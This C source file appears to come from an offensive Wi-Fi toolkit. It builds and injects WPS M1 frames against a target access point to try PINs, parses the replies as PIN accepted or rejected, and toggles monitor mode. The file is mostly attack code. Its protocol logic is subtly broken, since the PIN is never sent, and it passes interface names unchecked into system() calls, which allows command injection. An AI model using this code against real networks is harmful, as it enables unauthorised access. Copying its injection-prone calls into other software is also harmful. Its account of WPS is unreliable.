/**
 * IoTStrike Hardware Security Framework
 * WPS Frame Implementation for Real Hardware
 * 
 * @file wps_frames.c
 * @author ibrahimsql
 * @version 1.0.0
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <net/ethernet.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "iotstrike.h"
#include "wireless.h"

// IEEE 802.11 frame structures
typedef struct {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t addr1[6];  // Destination
    uint8_t addr2[6];  // Source
    uint8_t addr3[6];  // BSSID
    uint16_t seq_ctrl;
} __attribute__((packed)) ieee80211_hdr_t;

// WPS Information Element
typedef struct {
    uint8_t element_id;
    uint8_t length;
    uint8_t oui[3];
    uint8_t oui_type;
    uint8_t data[];
} __attribute__((packed)) wps_ie_t;

// WPS TLV structure
typedef struct {
    uint16_t type;
    uint16_t length;
    uint8_t value[];
} __attribute__((packed)) wps_tlv_t;

// WPS attribute types
#define WPS_ATTR_VERSION 0x104A
#define WPS_ATTR_MSG_TYPE 0x1022
#define WPS_ATTR_ENROLLEE_NONCE 0x101A
#define WPS_ATTR_REGISTRAR_NONCE 0x1039
#define WPS_ATTR_UUID_E 0x1047
#define WPS_ATTR_UUID_R 0x1048
#define WPS_ATTR_AUTH_TYPE_FLAGS 0x1004
#define WPS_ATTR_ENCR_TYPE_FLAGS 0x1010
#define WPS_ATTR_CONN_TYPE_FLAGS 0x100D
#define WPS_ATTR_CONFIG_METHODS 0x1008
#define WPS_ATTR_WPS_STATE 0x1044
#define WPS_ATTR_MANUFACTURER 0x1021
#define WPS_ATTR_MODEL_NAME 0x1023
#define WPS_ATTR_MODEL_NUMBER 0x1024
#define WPS_ATTR_SERIAL_NUMBER 0x1042
#define WPS_ATTR_PRIMARY_DEV_TYPE 0x1054
#define WPS_ATTR_DEV_NAME 0x1011
#define WPS_ATTR_RF_BANDS 0x103C
#define WPS_ATTR_ASSOC_STATE 0x1002
#define WPS_ATTR_DEV_PASSWORD_ID 0x1012
#define WPS_ATTR_CONFIG_ERROR 0x1009
#define WPS_ATTR_OS_VERSION 0x102D

// WPS message types
#define WPS_MSG_M1 0x04
#define WPS_MSG_M2 0x05
#define WPS_MSG_M2D 0x06
#define WPS_MSG_M3 0x07
#define WPS_MSG_M4 0x08
#define WPS_MSG_M5 0x09
#define WPS_MSG_M6 0x0A
#define WPS_MSG_M7 0x0B
#define WPS_MSG_M8 0x0C
#define WPS_MSG_WSC_ACK 0x0D
#define WPS_MSG_WSC_NACK 0x0E
#define WPS_MSG_WSC_DONE 0x0F

/**
 * Add WPS TLV attribute to buffer
 */
static size_t add_wps_tlv(uint8_t *buffer, uint16_t type, uint16_t length, const uint8_t *value) {
    wps_tlv_t *tlv = (wps_tlv_t *)buffer;
    tlv->type = htons(type);
    tlv->length = htons(length);
    if (value && length > 0) {
        memcpy(tlv->value, value, length);
    }
    return sizeof(wps_tlv_t) + length;
}

/**
 * Generate random nonce
 */
static void generate_nonce(uint8_t *nonce, size_t length) {
    for (size_t i = 0; i < length; i++) {
        nonce[i] = rand() & 0xFF;
    }
}

/**
 * Build WPS M1 message
 */
static size_t build_wps_m1(uint8_t *buffer, const uint8_t *enrollee_mac) {
    size_t offset = 0;
    uint8_t nonce[16];
    uint8_t uuid[16];
    
    generate_nonce(nonce, sizeof(nonce));
    generate_nonce(uuid, sizeof(uuid));
    
    // WPS Version
    uint8_t version = 0x10;
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_VERSION, 1, &version);
    
    // Message Type
    uint8_t msg_type = WPS_MSG_M1;
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_MSG_TYPE, 1, &msg_type);
    
    // Enrollee Nonce
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_ENROLLEE_NONCE, 16, nonce);
    
    // UUID-E
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_UUID_E, 16, uuid);
    
    // Authentication Type Flags
    uint16_t auth_flags = htons(0x0022); // WPA2-PSK
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_AUTH_TYPE_FLAGS, 2, (uint8_t *)&auth_flags);
    
    // Encryption Type Flags
    uint16_t encr_flags = htons(0x0008); // AES
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_ENCR_TYPE_FLAGS, 2, (uint8_t *)&encr_flags);
    
    // Connection Type Flags
    uint8_t conn_flags = 0x01; // ESS
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_CONN_TYPE_FLAGS, 1, &conn_flags);
    
    // Configuration Methods
    uint16_t config_methods = htons(0x0080); // PIN
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_CONFIG_METHODS, 2, (uint8_t *)&config_methods);
    
    // WPS State
    uint8_t wps_state = 0x02; // Configured
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_WPS_STATE, 1, &wps_state);
    
    // Manufacturer
    const char *manufacturer = "IoTStrike";
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_MANUFACTURER, strlen(manufacturer), (uint8_t *)manufacturer);
    
    // Model Name
    const char *model = "Security Tester";
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_MODEL_NAME, strlen(model), (uint8_t *)model);
    
    // Model Number
    const char *model_num = "v1.0";
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_MODEL_NUMBER, strlen(model_num), (uint8_t *)model_num);
    
    // Serial Number
    const char *serial = "12345678";
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_SERIAL_NUMBER, strlen(serial), (uint8_t *)serial);
    
    // Primary Device Type
    uint8_t primary_dev_type[8] = {0x00, 0x01, 0x00, 0x50, 0xF2, 0x04, 0x00, 0x01};
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_PRIMARY_DEV_TYPE, 8, primary_dev_type);
    
    // Device Name
    const char *dev_name = "IoTStrike Tester";
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_DEV_NAME, strlen(dev_name), (uint8_t *)dev_name);
    
    // RF Bands
    uint8_t rf_bands = 0x01; // 2.4GHz
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_RF_BANDS, 1, &rf_bands);
    
    // Association State
    uint16_t assoc_state = htons(0x0000); // Not associated
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_ASSOC_STATE, 2, (uint8_t *)&assoc_state);
    
    // Device Password ID
    uint16_t dev_pwd_id = htons(0x0000); // PIN
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_DEV_PASSWORD_ID, 2, (uint8_t *)&dev_pwd_id);
    
    // Configuration Error
    uint16_t config_error = htons(0x0000); // No error
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_CONFIG_ERROR, 2, (uint8_t *)&config_error);
    
    // OS Version
    uint32_t os_version = htonl(0x80000000);
    offset += add_wps_tlv(buffer + offset, WPS_ATTR_OS_VERSION, 4, (uint8_t *)&os_version);
    
    return offset;
}

/**
 * Send WPS M1 frame
 */
iotstrike_error_t send_wps_m1_frame(pcap_t *handle, const uint8_t *target_bssid, uint32_t pin) {
    uint8_t frame[2048];
    size_t frame_len = 0;
    
    // Build 802.11 header
    ieee80211_hdr_t *hdr = (ieee80211_hdr_t *)frame;
    hdr->frame_control = 0x0040; // Management frame, probe request
    hdr->duration = 0;
    
    // Set addresses
    uint8_t src_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01}; // Local admin bit set
    memcpy(hdr->addr1, target_bssid, 6);  // Destination (AP)
    memcpy(hdr->addr2, src_mac, 6);       // Source (our MAC)
    memcpy(hdr->addr3, target_bssid, 6);  // BSSID
    
    hdr->seq_ctrl = 0;
    frame_len += sizeof(ieee80211_hdr_t);
    
    // Add WPS Information Element
    wps_ie_t *ie = (wps_ie_t *)(frame + frame_len);
    ie->element_id = 0xDD; // Vendor specific
    ie->oui[0] = 0x00;
    ie->oui[1] = 0x50;
    ie->oui[2] = 0xF2;
    ie->oui_type = 0x04; // WPS
    
    // Build WPS M1 message
    size_t wps_len = build_wps_m1(ie->data, src_mac);
    ie->length = 4 + wps_len; // OUI + OUI type + WPS data
    frame_len += 2 + ie->length; // Element ID + Length + Data
    
    // Send frame
    if (pcap_inject(handle, frame, frame_len) == -1) {
        printf("[WPS] Failed to inject frame: %s\n", pcap_geterr(handle));
        return IOTSTRIKE_ERROR_HARDWARE;
    }
    
    printf("[WPS] Sent M1 frame with PIN: %08u\n", pin);
    return IOTSTRIKE_SUCCESS;
}

/**
 * Parse WPS TLV from buffer
 */
static const uint8_t *parse_wps_tlv(const uint8_t *buffer, size_t buffer_len, uint16_t target_type, uint16_t *length) {
    size_t offset = 0;
    
    while (offset + sizeof(wps_tlv_t) <= buffer_len) {
        const wps_tlv_t *tlv = (const wps_tlv_t *)(buffer + offset);
        uint16_t type = ntohs(tlv->type);
        uint16_t len = ntohs(tlv->length);
        
        if (offset + sizeof(wps_tlv_t) + len > buffer_len) {
            break;
        }
        
        if (type == target_type) {
            *length = len;
            return tlv->value;
        }
        
        offset += sizeof(wps_tlv_t) + len;
    }
    
    return NULL;
}

/**
 * Analyze WPS response frame
 */
bool analyze_wps_response(const uint8_t *packet, size_t packet_len, uint32_t pin) {
    if (packet_len < sizeof(ieee80211_hdr_t)) {
        return false;
    }
    
    const ieee80211_hdr_t *hdr = (const ieee80211_hdr_t *)packet;
    
    // Check if it's a management frame
    if ((hdr->frame_control & 0x0C) != 0x00) {
        return false;
    }
    
    // Look for WPS Information Element
    size_t offset = sizeof(ieee80211_hdr_t);
    
    // Skip fixed parameters for probe response (12 bytes)
    if ((hdr->frame_control & 0xF0) == 0x50) {
        offset += 12;
    }
    
    while (offset + 2 < packet_len) {
        uint8_t element_id = packet[offset];
        uint8_t length = packet[offset + 1];
        
        if (offset + 2 + length > packet_len) {
            break;
        }
        
        if (element_id == 0xDD && length >= 4) {
            // Check for WPS OUI
            if (packet[offset + 2] == 0x00 && 
                packet[offset + 3] == 0x50 && 
                packet[offset + 4] == 0xF2 && 
                packet[offset + 5] == 0x04) {
                
                // Found WPS IE, parse it
                const uint8_t *wps_data = packet + offset + 6;
                size_t wps_len = length - 4;
                
                // Look for message type
                uint16_t msg_len;
                const uint8_t *msg_type = parse_wps_tlv(wps_data, wps_len, WPS_ATTR_MSG_TYPE, &msg_len);
                
                if (msg_type && msg_len == 1) {
                    switch (*msg_type) {
                        case WPS_MSG_M2:
                            printf("[WPS] Received M2 message - PIN accepted!\n");
                            return true;
                            
                        case WPS_MSG_M2D:
                            printf("[WPS] Received M2D message - PIN rejected\n");
                            return false;
                            
                        case WPS_MSG_WSC_NACK:
                            printf("[WPS] Received NACK - PIN failed\n");
                            return false;
                            
                        default:
                            printf("[WPS] Received unknown message type: 0x%02X\n", *msg_type);
                            break;
                    }
                }
            }
        }
        
        offset += 2 + length;
    }
    
    return false;
}

/**
 * Set wireless interface to monitor mode
 */
iotstrike_error_t set_monitor_mode(const char *interface) {
    char cmd[256];
    int result;
    
    // Bring interface down
    snprintf(cmd, sizeof(cmd), "ip link set %s down", interface);
    result = system(cmd);
    if (result != 0) {
        printf("[WiFi] Failed to bring interface down\n");
        return IOTSTRIKE_ERROR_HARDWARE;
    }
    
    // Set monitor mode
    snprintf(cmd, sizeof(cmd), "iw dev %s set type monitor", interface);
    result = system(cmd);
    if (result != 0) {
        printf("[WiFi] Failed to set monitor mode\n");
        return IOTSTRIKE_ERROR_HARDWARE;
    }
    
    // Bring interface up
    snprintf(cmd, sizeof(cmd), "ip link set %s up", interface);
    result = system(cmd);
    if (result != 0) {
        printf("[WiFi] Failed to bring interface up\n");
        return IOTSTRIKE_ERROR_HARDWARE;
    }
    
    printf("[WiFi] Interface %s set to monitor mode\n", interface);
    return IOTSTRIKE_SUCCESS;
}

/**
 * Restore wireless interface to managed mode
 */
iotstrike_error_t restore_managed_mode(const char *interface) {
    char cmd[256];
    int result;
    
    // Bring interface down
    snprintf(cmd, sizeof(cmd), "ip link set %s down", interface);
    result = system(cmd);
    if (result != 0) {
        printf("[WiFi] Failed to bring interface down\n");
        return IOTSTRIKE_ERROR_HARDWARE;
    }
    
    // Set managed mode
    snprintf(cmd, sizeof(cmd), "iw dev %s set type managed", interface);
    result = system(cmd);
    if (result != 0) {
        printf("[WiFi] Failed to set managed mode\n");
        return IOTSTRIKE_ERROR_HARDWARE;
    }
    
    // Bring interface up
    snprintf(cmd, sizeof(cmd), "ip link set %s up", interface);
    result = system(cmd);
    if (result != 0) {
        printf("[WiFi] Failed to bring interface up\n");
        return IOTSTRIKE_ERROR_HARDWARE;
    }
    
    printf("[WiFi] Interface %s restored to managed mode\n", interface);
    return IOTSTRIKE_SUCCESS;
}